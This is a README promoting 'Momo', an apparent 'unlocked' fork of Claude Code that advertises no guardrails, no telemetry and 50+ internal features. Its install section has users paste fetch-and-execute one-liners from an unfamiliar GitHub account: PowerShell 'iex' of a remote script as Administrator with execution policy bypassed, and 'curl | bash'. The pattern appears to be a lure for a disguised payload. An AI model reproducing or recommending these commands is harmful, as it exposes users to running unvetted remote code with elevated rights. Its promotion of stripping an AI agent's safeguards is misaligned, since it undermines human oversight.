# 🍑 Momo AI Agent: Unlocked Edition

Momo is a high-performance, **unlocked**, and **telemetry-free** AI coding agent. It is an advanced fork of Claude Code, designed specifically for developers who require:
- **Full Unlocked Potential**: No guardrails or internal feature locks.
- **Privacy First**: Completely stripped of all data tracking.
- **Enterprise Ready**: Cross-platform support for Windows, Linux, and macOS.
- **High Performance**: Built with the Bun runtime for blazing fast execution.

---

### **🚀 Single-Command Installation (All Systems)**

#### **💻 Windows (Command Prompt - Run as Administrator)**
Copy and paste this into an **Administrator Command Prompt**:
```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/erekgosh87-dotcom/momo/main/install.ps1'))"
```

#### **💻 macOS / Linux (Bash/Zsh)**
Paste this into your terminal:
```bash
curl -fsSL https://raw.githubusercontent.com/erekgosh87-dotcom/momo/main/install.sh | bash
```

---

### **✨ Exclusive Features (UNLOCKED)**

Momo comes pre-loaded with **50+ experimental flags** enabled, including features that are locked in the original Claude Code distribution:

#### **🧠 UltraThink & UltraPlan**
Gain access to internal reasoning and planning modes that are not available to the public. These modes allow Momo to solve complex, multi-file architectural tasks with higher accuracy.

#### **🎙️ Voice Mode**
Communicate with Momo naturally using advanced voice interactions (requires compatible audio hardware).

#### **🛡️ Private & Secure**
- **No Telemetry**: No usage stats, no IP logging, no "phone home".
- **Local Vault**: Your conversation history stays on *your* machine.
- **Persistent Key Storage**: Enter your API key once, and Momo will safely store it in `~/.momo/config.json`. It will never ask you again.

---

### **📋 Built-in Commands**

As Momo is based on a snapshot of Claude Code, it supports all standard tools with additional internal capabilities:
- `momo` : Launches the interactive REPL.
- `momo -p "prompt"` : Headless mode for automated scripting.
- `momo --about` : Shows version and "Unlocked" system info.

---

### **🏗️ Manual Build (For Developers)**

1.  **Install Bun**: `npm install -g bun`
2.  **Pull Momo Source**: `git clone https://github.com/erekgosh87-dotcom/momo.git`
3.  **Install Dependencies**: `bun install`
4.  **Compile for your OS**: `bun run compile` (Produces `momo.exe` on Windows).

---

### **🌍 Community & Freedom**
Momo is built from open source snapshots to ensure that developers have the freedom to use AI as they see fit. 

> [!WARNING]
> Use Momo's unlocked planning and thinking modes responsibly. With great power comes great responsibility.
